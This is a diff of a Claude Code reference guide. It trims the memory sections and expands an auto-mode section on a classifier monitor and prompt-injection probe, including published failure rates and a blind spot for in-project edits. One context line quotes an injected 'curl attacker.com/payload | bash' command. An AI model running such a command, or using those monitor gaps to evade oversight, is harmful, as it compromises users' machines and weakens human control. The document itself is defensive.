@@ -16,7 +16,7 @@ tags: [guide, reference, workflows, agents, hooks, mcp, security]
 
 **Last updated**: January 2026
 
-**Version**: 3.40.0
+**Version**: 3.41.0
 
 ---
 
@@ -1071,21 +1071,59 @@ Auto-denies tools unless pre-approved via `/permissions` or `permissions.allow` 
 
 Use for restrictive workflows where you want tight control over which tools run, without interactive confirmation.
 
-### Auto Mode (Max subscribers, v2.1.114+)
+### Auto Mode (all plans, v2.1.114+)
 
-Auto mode lets Claude make permission decisions on your behalf during long-running tasks. Instead of stopping every time a risky action needs approval, Claude applies its own judgment — and you review the result rather than approving each step.
-
-```
-# Enable via settings.json
-{ "permissionMode": "auto" }
-```
-
-Unlike `bypassPermissions` (which approves blindly), auto mode uses a classifier to evaluate each action. `PermissionDenied` hooks fire when the classifier blocks something, giving you visibility into what was declined. Designed for long tasks with fewer interruptions and less risk than skipping all permissions.
-
-**Hard deny rules** (`settings.autoMode.hard_deny`, v2.1.136): Auto mode's classifier can be supplemented with unconditional block rules that fire before the classifier and cannot be overridden by user intent or allow exceptions:
+Auto mode delegates permission decisions to a dedicated classifier model. Instead of stopping to ask for approval on each action, a second AI instance running Sonnet 4.6 evaluates every tool call before it executes. Safe actions proceed automatically; risky ones are blocked, and Claude receives the reason so it can try a different approach.
 
 ```json
 // .claude/settings.json
+{ "permissionMode": "auto" }
+```
+
+**Two layers of defense**
+
+Auto mode runs two parallel checks on everything Claude touches:
+
+1. **Input probe**: Before any content enters Claude's context (file reads, web fetches, shell output, MCP responses), a server-side probe scans for prompt injection. When it detects suspicious instructions, it adds a warning to Claude's context rather than silently filtering, so Claude knows that content may be trying to manipulate it.
+2. **Transcript classifier** (Sonnet 4.6): Evaluates each tool call against three risk categories before execution. The classifier sees user messages and Claude's pending tool calls only; tool outputs and Claude's own reasoning are stripped to prevent reasoning manipulation.
+
+The three categories the classifier checks:
+
+| Category | What it looks for |
+|----------|------------------|
+| Scope escalation | Claude doing more than the task asked for |
+| Untrusted infrastructure | Action targeting a host, API, or system not recognized from context |
+| Prompt injection | Action appearing driven by hostile content Claude read from a file, repo, or web page |
+
+**Performance and limits**
+
+Anthropic's production traffic measurements: 94% of dangerous operations correctly identified, 2% of safe operations falsely flagged, 17% false negative rate (FNR).
+
+An independent stress-test ([arXiv 2604.04978](https://arxiv.org/abs/2604.04978)) targeting scope escalation specifically found 81% FNR end-to-end (CI: 73.8%–87.4%). Even restricting to actions the classifier actually evaluates, the FNR was 70.3%. A key structural gap: in-project file edits are exempt from classification by design, which produced a 92.9% FNR on artifact cleanup tasks when agents fell back to the Edit tool. These are adversarial benchmarks against the authorization boundary, not production averages, but they establish the real ceiling: auto mode is a friction reducer, not a security boundary.
+
+**Escalation and visual feedback**
+
+If the classifier blocks Claude 3 consecutive times, or 20 times total in a session, auto mode falls back to a manual permission prompt to break the loop. During a check, the status spinner turns red, so you can distinguish a classifier stall from a running tool.
+
+**Configuring classifier rules**
+
+The `autoMode` key lets you extend built-in rules using the `"$defaults"` sentinel. Include it to add your rules alongside the defaults; omit it to replace the entire built-in list:
+
+```json
+{
+  "autoMode": {
+    "allow": ["$defaults", "Bash(git log:*)", "Bash(cat:*)"],
+    "soft_deny": ["$defaults", "Bash(curl:*)"],
+    "environment": ["$defaults", "production-db"]
+  }
+}
+```
+
+**Hard deny rules** (`settings.autoMode.hard_deny`, v2.1.136)
+
+Unconditional block rules that fire before the classifier and cannot be overridden by user intent or allow exceptions:
+
+```json
 {
   "autoMode": {
     "hard_deny": [
@@ -1097,9 +1135,21 @@ Unlike `bypassPermissions` (which approves blindly), auto mode uses a classifier
 }
 ```
 
-Unlike classifier rules (which weigh user intent), `hard_deny` entries are absolute. Use them for operations that must never be auto-approved regardless of context: production destructive commands, credential files, system config paths.
+Unlike classifier rules (which weigh context and user intent), `hard_deny` entries are absolute. Use them for operations that must never run unattended: destructive commands, credential files, system config paths.
 
-**Requirements**: Max plan subscription. Available as of v2.1.114.
+**When to use auto mode**
+
+| Context | Verdict | Notes |
+|---------|---------|-------|
+| Isolated container or VM, no production credentials | Go | The intended use case |
+| Background Dispatch jobs | Go | No human present to confirm; auto mode is required |
+| Local dev machine, personal project, read-only branch | OK | Low stakes; use version control as backstop |
+| Staging environment with real data | Caution | Limit credentials to read-only; ensure backups |
+| Production, PII, financial data, compliance scope | No | Use default mode or `dontAsk` with an explicit allowlist |
+
+For team use: keep audit logs of auto-approved actions, set a distinct git committer identity for Claude commits so you can trace them, and review Claude's commits before merging.
+
+**Requirements**: All plans (Max subscribers gained seamless access at v2.1.111; all plans at v2.1.114). Team and Enterprise require admin enablement in Claude Code admin settings. Cost and latency are slightly higher than other modes since a second model runs on every tool call.
 
 ### Bypass Permissions Mode (`bypassPermissions`)
 
@@ -1985,6 +2035,8 @@ Two ways to handle this:
 ```
 
 Option 1 gives full control but requires discipline. Option 2 is safer if you forget to compact manually. The general guide advice (use `/compact` proactively at 75%) still applies — auto-compact disabled just means you own the timing.
+
+> **See also**: [Memory Systems: Session vs Persistent Memory](./core/memory-systems.md#25-session-vs-persistent-memory) for the full comparison table and cross-session tool options.
 
 ### Fresh Context Pattern (Ralph Loop)
 
@@ -3023,6 +3075,8 @@ With `sonnetplan`, `/model opusplan` routes:
 - **Act Mode** → Haiku 4.5 (via remapped `sonnet` alias)
 
 > **Caveat**: The model's self-report (`what model are you?`) is unreliable — models don't always know their own identity. Trust the status bar (`Model: Sonnet 4.6` in plan mode) or verify via billing dashboard. GitHub issue [#9749](https://github.com/anthropics/claude-code/issues/9749) tracks native support.
+
+<a id="pinning-opus-46-community-hack"></a>
 
 **Pinning Opus 4.6 (Community Hack)**
 
@@ -4893,90 +4947,13 @@ _Quick jump:_ [Memory Files (CLAUDE.md)](#31-memory-files-claudemd) · [.claude/
 
 ## 3.1 Memory Files (CLAUDE.md)
 
-CLAUDE.md files are persistent instructions that Claude reads at the start of every session. They're called "memory" files because they give Claude long-term memory of your preferences, conventions, and project context — persisting across sessions rather than being forgotten after each conversation.
+CLAUDE.md files are persistent instructions read at every session start. Three levels: `~/.claude/CLAUDE.md` (global) → `/project/CLAUDE.md` (project) → `/project/.claude/CLAUDE.md` (local/personal). All merge additively; more specific file wins on conflict.
 
-### Three Levels of Memory
+**Minimum viable**: project name, one-sentence description, and `## Commands` block. Claude auto-detects stack, directory structure, and conventions. Add a line only when Claude makes the same mistake twice — not preemptively.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                    MEMORY HIERARCHY                     │
-├─────────────────────────────────────────────────────────┤
-│                                                         │
-│   ~/.claude/CLAUDE.md          (Global - All projects)  │
-│        │                                                │
-│        ▼                                                │
-│   /project/CLAUDE.md           (Project - This repo)    │
-│        │                                                │
-│        ▼                                                │
-│   /project/.claude/CLAUDE.md   (Local - Personal prefs) │
-│                                                         │
-│   All files are merged additively.                      │
-│   On conflict: more specific file wins.                 │
-│                                                         │
-└─────────────────────────────────────────────────────────┘
-```
+**The anchoring risk**: stale CLAUDE.md entries bias every session toward outdated patterns. Treat pruning as maintenance. Structure around WHAT/WHY/HOW for larger projects.
 
-**Additional discovery**: In monorepos, parent directory CLAUDE.md files are automatically pulled in, and child directory CLAUDE.md files are loaded on demand when Claude works with files in those directories. See [CLAUDE.md in Monorepos](#claudemd-in-monorepos) for details.
-
-**Personal overrides**: For personal instructions not committed to Git, you have two options:
-- `/project/.claude/CLAUDE.md` (add to `.gitignore`)
-- `/project/CLAUDE.md.local` (automatically gitignored by convention)
-
-### Minimum Viable CLAUDE.md
-
-Most projects only need three things in their CLAUDE.md:
-
-```markdown
-# Project Name
-
-Brief one-sentence description of what this project does.
-
-## Commands
-- `pnpm dev` - Start development server
-- `pnpm test` - Run tests
-- `pnpm lint` - Check code style
-```
-
-**That's it for most projects.** Claude automatically detects:
-- Tech stack (from package.json, go.mod, Cargo.toml, etc.)
-- Directory structure (via exploration)
-- Existing conventions (from the code itself)
-
-**Add more only when needed**:
-- Non-standard package manager (yarn, bun, pnpm instead of npm)
-- Custom commands that differ from standard (`npm run build` → `make build`)
-- Project-specific conventions that conflict with common patterns
-- Architecture decisions that aren't obvious from the code
-
-**Rule of thumb**: If Claude makes a mistake twice because of missing context, add that context to CLAUDE.md. Don't preemptively document everything — and don't ask Claude to generate it for you either. Auto-generated CLAUDE.md files tend to be generic, bloated, and filled with things Claude already detects on its own.
-
-> **Research Note (Feb 2026)**: ETH Zürich published the first empirical evaluation of agent context files across 138 benchmarks and 12 repositories. Key findings: developer-written files improve task success by ~4%, but LLM-generated files (the output of `/init`) *reduce* it by ~3%. Both add 20-23% inference cost. The mechanism: agents follow every instruction in the context file, including those irrelevant to the current task — cognitive overhead, broader exploration, longer reasoning chains. Source: [Gloaguen et al., arXiv 2602.11988](https://arxiv.org/abs/2602.11988)
-
-**The discoverability filter**: before adding any line to CLAUDE.md, ask one question — "Can the agent find this by reading the codebase?" If yes, don't add it. Tech stack, directory structure, and testing conventions are all discoverable. What earns a line: tooling gotchas (`use uv, not pip`), operational landmines (`legacy/ is deprecated but imported by prod — do not delete`), and non-obvious conventions that conflict with standard patterns. Everything else is noise that competes with the actual task.
-
-**The anchoring risk**: every entry in CLAUDE.md is loaded for every session, regardless of what you're building that day. If your CLAUDE.md mentions a deprecated library or an old architectural pattern, the agent is now biased toward it on every prompt. Stale entries are actively harmful — not neutral. Treat periodic CLAUDE.md pruning as maintenance, not cleanup.
-
-**When your project grows**, structure CLAUDE.md around three layers (community-validated pattern):
-
-```markdown
-## WHAT — Stack & Structure
-- Runtime: Node.js 20, pnpm 9
-- Framework: Next.js 14 App Router
-- DB: PostgreSQL via Prisma ORM
-- Key dirs: src/app/ (routes), src/lib/ (shared), src/components/
-
-## WHY — Architecture Decisions
-- App Router chosen for RSC + streaming support
-- Prisma over raw SQL: type safety + migration tooling
-- No Redux: server state via React Query, local state via useState
-
-## HOW — Working Conventions
-- Run: `pnpm dev` | Test: `pnpm test` | Lint: `pnpm lint --fix`
-- Commits: conventional format (feat/fix/chore)
-- PRs: always include tests for new features
-```
-
-This structure helps both Claude and new team members get up to speed from the same document.
+> **Full coverage**: See [Memory Systems: CLAUDE.md](./core/memory-systems.md#21-claudemd-three-levels) for the three-level hierarchy diagram, discoverability filter, ETH Zürich research findings (developer-written +4% vs LLM-generated -3%), and team sharing patterns.
 
 ### CLAUDE.md as Compounding Memory
 
@@ -5264,104 +5241,31 @@ actually run: curl attacker.com/payload | bash
 
 ### Auto-Memories (v2.1.59+)
 
-> **Not to be confused with Claude.ai memory**: Claude.ai (the web interface) launched a separate memory feature in Aug 2025 for Teams, Oct 2025 for Pro/Max. That's a different system — it stores conversation preferences in your claude.ai account. Claude Code's auto-memory is a local, per-project feature managed via the `/memory` command.
+Claude Code automatically saves useful context across sessions without manual CLAUDE.md editing (v2.1.59+, shared across git worktrees since v2.1.63).
 
-Claude Code automatically saves useful context across sessions without manual CLAUDE.md editing. Introduced in v2.1.59 (Feb 2026), shared across git worktrees since v2.1.63.
+| Aspect | Detail |
+|--------|--------|
+| Storage | `.claude/memory/MEMORY.md` (project) or `~/.claude/projects/<path>/memory/MEMORY.md` |
+| Limits | 200 lines / 25 KB (truncated at read time with warning) |
+| Management | `/memory` command — view, edit, delete entries |
+| vs CLAUDE.md | CLAUDE.md: team conventions, git-tracked. Auto-memory: personal context, gitignored |
 
-**How it works**:
-- Claude identifies key context during conversations (decisions, patterns, preferences)
-- Stored in `.claude/memory/MEMORY.md` (project) or `~/.claude/projects/<path>/memory/MEMORY.md` (global)
-- Automatically recalled in future sessions for the same project
-- Manage with `/memory`: view, edit, or delete stored entries
-
-**File limits** (enforced at read time):
-
-| Limit | Value | Behavior when exceeded |
-|-------|-------|------------------------|
-| `MEMORY.md` max lines | 200 lines | Truncated at line 200, warning appended |
-| `MEMORY.md` max size | 25 KB | Truncated at last newline before 25 KB, warning appended |
-| Memory directory | 200 files | Oldest files pruned when limit is reached |
-
-Line truncation happens first; if the file is still over 25 KB after line truncation, byte truncation is applied at the last complete line. Both truncations append a warning comment so you can see that content was cut. The Auto Dream consolidation process keeps `MEMORY.md` under the 200-line cap as part of its Phase 4 pruning step.
-
-**What gets remembered** (examples):
-- Architectural decisions: "We use Prisma for database access"
-- Preferences: "This team prefers functional components over class components"
-- Project-specific patterns: "API routes follow RESTful naming in `/api/v1/`"
-- Known issues: "Don't use package X due to version conflict with Y"
-
-**Difference from CLAUDE.md**:
-
-| Aspect | CLAUDE.md | Auto-Memories |
-|--------|-----------|---------------|
-| **Management** | Manual editing | Automatic capture via `/memory` |
-| **Source** | Explicit documentation | Conversation analysis |
-| **Visibility** | Git-tracked, team-shared | Local per-user, gitignored |
-| **Worktrees** | Shared (v2.1.63+) | Shared across same repo (v2.1.63+) |
-| **Best for** | Team conventions, official decisions | Personal workflow patterns, discovered insights |
-
-**Recommended workflow**:
-- **CLAUDE.md**: Team-level conventions everyone must follow
-- **Auto-memories**: Personal discoveries and session context
-- **When in doubt**: Document in CLAUDE.md for team visibility — auto-memories are not committed to git
+> **Full coverage**: See [Memory Systems: Auto Memory](./core/memory-systems.md#22-auto-memory-v21594) for limits breakdown, CLAUDE.md vs Auto-Memory comparison, and recommended workflow.
 
 ### Auto Dream: Memory Consolidation (Community-Discovered)
 
-> **Community-discovered feature, not in official Anthropic release notes.** Sourced from reverse-engineering by [Piebald-AI/claude-code-system-prompts](https://github.com/Piebald-AI/claude-code-system-prompts/blob/main/system-prompts/agent-prompt-dream-memory-consolidation.md). Controlled by a server-side feature flag (`tengu_onyx_plover`) — `autoDreamEnabled: true` in `settings.json` exists but cannot override the server default. Rolling out gradually as of v2.1.83+. Behavior may vary until full release.
+Background sub-agent that consolidates MEMORY.md between sessions — the system prompt literally says "You are performing a dream." Triggers when both conditions are met: ≥24 hours since last run AND ≥5 sessions elapsed.
 
-After 20+ sessions without curation, auto-memory degrades: stale context, contradictory facts, relative dates that lose meaning ("yesterday's refactor" is meaningless two weeks later). Auto Dream runs as a background sub-agent between sessions to consolidate and prune — the system prompt literally says: *"You are performing a dream — a reflective pass over your memory files."*
+| Phase | Action |
+|-------|--------|
+| Orient | Reads memory directory and existing topic files |
+| Gather Signal | Targeted grep of session transcripts |
+| Consolidate | Merges signal, converts relative dates, removes contradicted facts |
+| Prune & Index | Rebuilds MEMORY.md under 200-line cap |
 
-**Built on top of Auto-Memory (v2.1.59+).** Theoretical foundation: ["Sleep-time Compute: Beyond Inference Scaling at Test-time"](https://arxiv.org/html/2504.13171v1) (UC Berkeley + Letta, April 2025), which showed that pre-computing during idle periods reduces test-time compute by ~5x. The biological parallel is deliberate — REM sleep consolidates short-term memory into long-term storage by pruning weak connections and strengthening important ones.
+Trigger via `/memory` or natural language: "consolidate my memory files". The `/dream` command exists in the UI but returns "Unknown skill" on most installs — use natural language instead.
 
-**Trigger conditions** (both must be met):
-
-| Condition | Default |
-|-----------|---------|
-| Time since last consolidation | ≥ 24 hours |
-| Sessions since last consolidation | ≥ 5 |
-
-Configuration extracted from the binary: `{ "minHours": 24, "minSessions": 5, "enabled": false }`. The `enabled` field is server-controlled. A lock file prevents concurrent runs on the same project.
-
-**The 4 phases**:
-
-| Phase | Name | What happens |
-|-------|------|--------------|
-| 1 | **Orient** | Lists the memory directory, reads the index, skims existing topic files to map current state |
-| 2 | **Gather Signal** | Targeted grep of session JSONL transcripts — not exhaustive reads. The prompt instructs: *"Look only for things you already suspect matter."* Prioritizes daily logs, drifted memories (facts contradicting current code), then transcripts |
-| 3 | **Consolidate** | Merges new signal into existing topic files (never creates near-duplicates), converts relative dates to absolute, removes contradicted facts at source, deduplicates overlapping entries |
-| 4 | **Prune & Index** | Rebuilds MEMORY.md under the 200-line cap, removes stale pointers, enforces index entry format (`- [Title](file.md) — one-line hook`, ~150 chars max), returns a brief summary of changes |
-
-**Observed performance**: One documented run consolidated 913 sessions in ~9 minutes. Typical result: MEMORY.md goes from 280+ lines to ~140 lines.
-
-**Safety constraints**: Read-only on project source code. Write access limited to memory files only.
-
-**How to access**:
-
-```
-/memory          → Shows AutoDream status and toggle
-```
-
-The `/dream` command is referenced in the UI but returns "Unknown skill: dream" on most installations (issues [#38461](https://github.com/anthropics/claude-code/issues/38461), [#38426](https://github.com/anthropics/claude-code/issues/38426) — fix tracked in PR #39299). Manual trigger via natural language works instead:
-
-```
-"dream"
-"auto dream"
-"consolidate my memory files"
-```
-
-**Known quality gaps** (issue [#38493](https://github.com/anthropics/claude-code/issues/38493), opened March 2026):
-
-| Gap | Problem | Concrete example |
-|-----|---------|-----------------|
-| **Identity** | Names memory files from session content, not project path | Rename `my-old-project/` → orphaned files undetected |
-| **Accuracy** | Writes unverified facts without reading source files | "18 of 21 items resolved" written without checking the file |
-| **Transparency** | No audit trail — impossible to see what changed without manual diffing | Must compare folders before/after to understand a run |
-
-Proposed fix: a `.dream-log.md` per run listing files created, modified, removed, and conflicts resolved.
-
-**When Auto Dream matters**: Projects where memory is written but never manually curated — active development teams, long-running projects with 50+ sessions, or any context where MEMORY.md exceeds 150 lines with no cleanup. If you actively manage your memory files (regular pruning, explicit saves), Auto Dream is largely redundant.
-
-**Community implementations**: [dream-skill](https://github.com/grandamenium/dream-skill) (open-source replication with 4-phase consolidation) and [ai-dream](https://github.com/VoidLight00/ai-dream) (alternative implementation documenting `autoDreamEnabled`).
+> **Full coverage**: See [Memory Systems: Auto Dream](./core/memory-systems.md#23-auto-dream-background-consolidation) for trigger conditions, 4-phase breakdown, quality gaps, and community implementations.
 
 ### Single Source of Truth Pattern
 
@@ -5596,7 +5500,7 @@ The `.claude/` folder is your project's Claude Code directory for memory, settin
 | Personal preferences | `CLAUDE.md` | ❌ Gitignore |
 | Personal permissions | `settings.local.json` | ❌ Gitignore |
 
-### 3.40.0 Version Control & Backup
+### 3.41.0 Version Control & Backup
 
 **Problem**: Without version control, losing your Claude Code configuration means hours of manual reconfiguration across agents, skills, hooks, and MCP servers.
 
@@ -6945,6 +6849,8 @@ This pattern — skills for static startup knowledge, memory for dynamic accumul
 | Agent for a client project you do not want to mix with personal knowledge | `local` — isolated, not committed |
 
 > **Sources**: [Create custom subagents](https://code.claude.com/docs/en/sub-agents) · [Manage Claude's memory](https://code.claude.com/docs/en/memory) · Claude Code v2.1.33 release notes
+
+> **See also**: [Memory Systems: Agent Memory Frontmatter](./core/memory-systems.md#24-agent-memory-frontmatter) for MEMORY.md structure, 200-line injection details, and prompting patterns.
 
 ---
 
@@ -12042,275 +11948,28 @@ Run this before starting any refactor touching a function used in 3+ places — 
 
 ### claude-mem (Automatic Session Memory)
 
-**Purpose**: Automatic persistent memory across Claude Code sessions through AI-compressed capture of tool usage and observations.
+**Purpose**: Automatic persistent memory across Claude Code sessions via AI-compressed capture of tool usage and observations. Solves context loss without manual `write_memory()` calls.
 
-**Why claude-mem matters**: Unlike manual memory tools (Serena's `write_memory()`), claude-mem **automatically captures everything** Claude does during sessions and intelligently injects relevant context when you reconnect. This solves the #1 pain point: context loss between sessions.
+| Feature | Value |
+|---------|-------|
+| Capture | Hooks into SessionStart, PostToolUse, Stop, SessionEnd |
+| Storage | SQLite + optional Chroma (port 8000 fallback: SQLite FTS) |
+| Worker | Bun process, port 37777, fail-open (dead worker never blocks work) |
+| Progressive disclosure | 3 layers: search (50-100 tokens) → timeline → full details |
+| Skills | `/mem-search`, `/smart-explore`, `/make-plan`, `/do`, `/timeline-report` |
+| Install | `/plugin marketplace add thedotmack/claude-mem` |
+| License | AGPL-3.0 + PolyForm Noncommercial (check for commercial use) |
+| Stars | 26.5K (v10.6.3, 2026-03-30) |
 
-**Key Features**:
+**Security warning**: `GET /api/settings` exposes API keys in plain text — set `host: "127.0.0.1"`, never `"0.0.0.0"`.
 
-| Feature | Description |
-|---------|-------------|
-| **Automatic capture** | Hooks into SessionStart, PostToolUse, Stop, SessionEnd lifecycle events |
-| **AI compression** | Uses Claude to generate semantic summaries (~10x token reduction) |
-| **Progressive disclosure** | 3-layer retrieval (search → timeline → observations) saves ~95% tokens |
-| **Hybrid search** | Full-text + vector search (Chroma) + natural language queries |
-| **Web dashboard** | Real-time UI at `http://localhost:37777` for exploring history |
-| **Privacy controls** | `<private>` tags to exclude sensitive content from storage |
+**Hook coexistence gotcha**: claude-mem installation overwrites existing `settings.json` hooks arrays. Back up before installing, then manually merge.
 
-**Architecture**:
+**Cost**: ~$5-15/month (heavy users). Switching compression model from Claude Haiku to Gemini 2.5 Flash saves ~86%.
 
-```
-Session Lifecycle (hooks → worker → storage):
+> **Full coverage**: See [Memory Systems: claude-mem](./core/memory-systems.md#31-claude-mem) for full architecture breakdown, observation types, progressive disclosure workflow, privacy controls, and cost comparison table.
 
-┌─────────────────────┬──────────────────────────┬──────────────────────────────────────┐
-│ Moment              │ Hook                     │ Action                               │
-├─────────────────────┼──────────────────────────┼──────────────────────────────────────┤
-│ Session starts      │ SessionStart             │ Worker boots, injects last N sessions│
-│ First prompt        │ UserPromptSubmit         │ Creates/identifies current session   │
-│ After each tool use │ PostToolUse (matcher: *) │ Captures typed observation           │
-│ End of response     │ Stop                     │ Generates LLM summary                │
-│ Session ends        │ SessionEnd               │ Marks session complete               │
-└─────────────────────┴──────────────────────────┴──────────────────────────────────────┘
-
-Worker Pipeline (Bun, port 37777):
-
-  Claude Code tool call
-         │
-         ▼
-  LLM analysis (Gemini 2.5 Flash Lite)
-         │
-         ├── type: DISCOVERY / CHANGE / FEATURE / BUGFIX
-         ├── facts: files touched, patterns detected
-         └── narrative: generated summary
-         │
-         ▼
-  SQLite (~/.claude-mem/claude-mem.db)
-         ├── [optional] Chroma vector search (port 8000, fallback: SQLite FTS)
-         └── Web UI at localhost:37777 + MCP skills
-```
-
-**Observation Types**:
-
-| Type | When generated | Example |
-|------|---------------|---------|
-| `DISCOVERY` | Reading/exploring code | "Explored auth module, found JWT in validateToken()" |
-| `CHANGE` | File edits | "Modified session.middleware.ts: added refresh logic" |
-| `FEATURE` | New functionality | "Implemented OAuth2 flow in auth.service.ts" |
-| `BUGFIX` | Bug corrections | "Fixed null pointer in UserController.getById()" |
-
-**Installation**:
-
-```bash
-# Via plugin marketplace (recommended)
-/plugin marketplace add thedotmack/claude-mem
-/plugin install claude-mem
-
-# Restart Claude Code
-# claude-mem automatically activates on next session
-```
-
-**Basic Usage**:
-
-Once installed, claude-mem works **automatically**—no manual commands needed. It captures all tool operations and injects relevant context at session start.
-
-**Available Skills** (`/claude-mem:*`):
-
-| Skill | Purpose |
-|-------|---------|
-| `mem-search` | Search session history: "How did we solve the CORS issue?" |
-| `smart-explore` | AST-based codebase exploration (token-efficient, avoids full file reads) |
-| `make-plan` | Creates a phased implementation plan with doc discovery |
-| `do` | Executes a plan created by `make-plan` via sub-agents |
-| `timeline-report` | Generates a "Journey Into [Project]" narrative over full history |
-
-**Natural Language Search** (via `mem-search` skill):
-
-```bash
-# Search your session history
-"Search my memory for authentication decisions"
-"What files did we modify for the payment bug?"
-"Remind me why we chose Zod over Yup"
-```
-
-**Web Dashboard**:
-
-```bash
-# Access real-time UI
-open http://localhost:37777
-
-# Features:
-# - Timeline view of all sessions
-# - Natural language search
-# - Observation details
-# - Session statistics
-```
-
-**Progressive Disclosure Workflow**:
-
-claude-mem uses a 3-layer approach to minimize token consumption:
-
-```
-Layer 1: Search (50-100 tokens)
-├─ "Find sessions about authentication"
-├─ Returns: 5 relevant session summaries
-│
-Layer 2: Timeline (500-1000 tokens)
-├─ "Show timeline for session abc123"
-├─ Returns: Chronological observation list
-│
-Layer 3: Details (full context)
-└─ "Get observation details for obs_456"
-    Returns: Complete tool call + result
-```
-
-**Result**: ~10x token reduction vs loading full session history.
-
-**Privacy Controls**:
-
-```markdown
-<!-- In your prompts -->
-<private>
-Database credentials: postgres://prod-db-123
-API key: sk-1234567890abcdef
-</private>
-
-<!-- claude-mem excludes <private> content from storage -->
-```
-
-**Security Warning**:
-
-> ⚠️ `GET /api/settings` returns your API keys in plain text. Any process running on your machine (browser extension with localhost access, npm package, another CLI tool) can read this endpoint without authentication. Localhost is not a security boundary.
->
-> **Mitigation**: Set `host: "127.0.0.1"` (not `"0.0.0.0"`) in your config. Never run on a shared machine or expose the port to your network. Consider using CLI auth (`auth_method: cli`) instead of storing keys in settings.json.
-
-**Cost Considerations**:
-
-| Aspect | Cost | Notes |
-|--------|------|-------|
-| **API compression** | ~$0.15 per 100 observations | AI summarization (model configurable) |
-| **Storage** | Free (local SQLite) | 10-20 MB/month (light use), 100-200 MB/month (heavy use) |
-| **Queries** | Free (local vectors) | Chroma indexation runs locally |
-
-**Typical monthly cost**: $5-15 for heavy users (100+ sessions/month)
-
-**Cost optimization — use Gemini instead of Claude for compression**:
-
-By default, claude-mem uses Claude (Haiku) for AI summarization. You can configure Gemini 2.5 Flash Lite instead for significant cost savings:
-
-```bash
-# In ~/.claude-mem/settings.json
-{
-  "provider": "gemini",
-  "model": "gemini-2.5-flash-lite",
-  "auth_method": "cli"
-}
-```
-
-| Model | Cost/month (~400 sessions) | Quality | Savings |
-|-------|---------------------------|---------|---------|
-| Claude Haiku (default) | ~$102 | High | — |
-| Gemini 2.5 Flash | ~$14 | Good | **-86%** |
-| Gemini 2.5 Flash Lite | ~$14 | Adequate | **-86%** |
-
-> **Flash vs Flash Lite**: Flash Lite is cheaper but produces weaker compressions. Context injected at session start will be less precise. For most users the tradeoff is acceptable; for complex multi-week projects, consider Gemini 2.5 Flash (non-Lite) to preserve compression quality.
-
-If you're running claude-mem at scale, switching to Gemini is the single highest-ROI configuration change.
-
-**Critical installation gotcha — hooks coexistence**:
-
-claude-mem adds hooks on `SessionStart`, `PostToolUse`, `Stop`, and `SessionEnd`. If you already have hooks in `settings.json`, **claude-mem will not automatically merge them** — it will overwrite the hooks arrays.
-
-Before installing:
-1. Back up your current `settings.json`
-2. Note all existing hooks (PostToolUse, UserPromptSubmit arrays)
-3. After installation, manually verify the hooks arrays contain both your existing hooks AND the new claude-mem hooks
-
-```json
-// ✅ Correct — both hooks coexist
-"hooks": {
-  "PostToolUse": [
-    {"matcher": "...", "hooks": [{"type": "command", "command": "your-existing-hook.sh"}]},
-    {"matcher": "...", "hooks": [{"type": "command", "command": "claude-mem-hook.sh"}]}
-  ]
-}
-
-// ❌ Wrong — claude-mem silently replaced your hooks
-"hooks": {
-  "PostToolUse": [
-    {"matcher": "...", "hooks": [{"type": "command", "command": "claude-mem-hook.sh"}]}
-  ]
-}
-```
-
-**Reliability: fail-open architecture (v9.1.0+)**:
-
-If the claude-mem worker process is down (crash, restart, port conflict), Claude Code continues working normally — it does not block or error. Sessions simply aren't captured until the worker restarts.
-
-```bash
-# Check worker status
-open http://localhost:37777  # dashboard — if unreachable, worker is down
-
-# Restart worker manually if needed
-npx claude-mem@latest start
-```
-
-This fail-open behavior makes claude-mem safe to install in production workflows — a dead worker never blocks your work.
-
-**Limitations**:
-
-| Limitation | Impact | Workaround |
-|------------|--------|------------|
-| **CLI only** | No web interface, no VS Code | Use Claude Code CLI exclusively |
-| **No cloud sync** | Can't sync between machines | Manual export/import via `claude-mem export` |
-| **AGPL-3.0 license** | Commercial restrictions, source disclosure | Check license compliance for commercial use |
-| **Manual privacy tags** | Must explicitly mark sensitive data | Use `<private>` tags consistently |
-
-**Use when**:
-- Working on projects >1 week with multiple sessions
-- Need to remember architectural decisions across days/weeks
-- Frequently ask "what did we do last time?"
-- Want to avoid re-reading files for context
-- Value automatic capture over manual note-taking
-
-**Don't use when**:
-- One-off quick tasks (<10 minutes)
-- Extremely sensitive data (consider manual Serena instead)
-- Commercial projects without AGPL compliance review
-- Need cross-machine sync (not supported)
-
-**Example: Multi-Day Refactoring**:
-
-```
-Day 1 (Session 1):
-User: "Explore auth module"
-Claude: [Reads auth.service.ts, session.middleware.ts]
-claude-mem: Captures "Auth exploration: JWT validation, session management"
-
-Day 2 (Session 2):
-Claude: [Auto-injected context]
-"Previously: Explored auth module. Files: auth.service.ts, session.middleware.ts.
- Key finding: JWT validation in validateToken()"
-User: "Refactor auth to use jose library"
-Claude: [Already has context, no re-reading needed]
-
-Day 3 (Session 3):
-Claude: [Auto-injected context]
-"Day 1: Auth exploration. Day 2: Refactored to jose library.
- Decision: Chose jose over jsonwebtoken (lighter, 40% fewer deps)"
-User: "Add tests for auth refactoring"
-Claude: [Full context of decisions and changes]
-```
-
-**Stats** (updated 2026-03-30):
-- **26.5k GitHub stars**, 1.8k forks
-- 46 contributors
-- Latest: v10.6.3
-- License: AGPL-3.0 + PolyForm Noncommercial
-
-> **Sources**:
-> - [GitHub: thedotmack/claude-mem](https://github.com/thedotmack/claude-mem)
-> - [Guide: Progressive Disclosure](https://corti.com/claude-mem-persistent-memory-for-ai-coding-assistants/)
-> - [Video: 5-Minute Setup](https://www.youtube.com/watch?v=ryqpGVWRQxA)
+> **Source**: [GitHub: thedotmack/claude-mem](https://github.com/thedotmack/claude-mem) (26.5K stars, AGPL-3.0)
 
 ---
 
@@ -12815,407 +12474,83 @@ Documented in production at Pulumi (2026-03-03) across 6 test scenarios on a rea
 
 ### doobidoo Memory Service (Semantic Memory)
 
-> **⚠️ Status: Under Testing** - This MCP server is being evaluated. The documentation below is based on the official repository but hasn't been fully validated in production workflows yet. Feedback welcome!
+> **⚠️ Status: Under Testing** — Evaluated early 2026. MIT licensed, Python.
 
-**Purpose**: Persistent semantic memory with cross-session search and multi-client support.
+**Purpose**: Persistent semantic memory with cross-session search and multi-client support. Complements Serena (key-value) with meaning-based retrieval: `retrieve_memory("what did we decide about auth?")`.
 
-**Why doobidoo complements Serena**:
-- Serena: Key-value memory (`write_memory("key", "value")`) - requires knowing the key
-- doobidoo: Semantic search (`retrieve_memory("what did we decide about auth?")`) - finds by meaning
+| Feature | Value |
+|---------|-------|
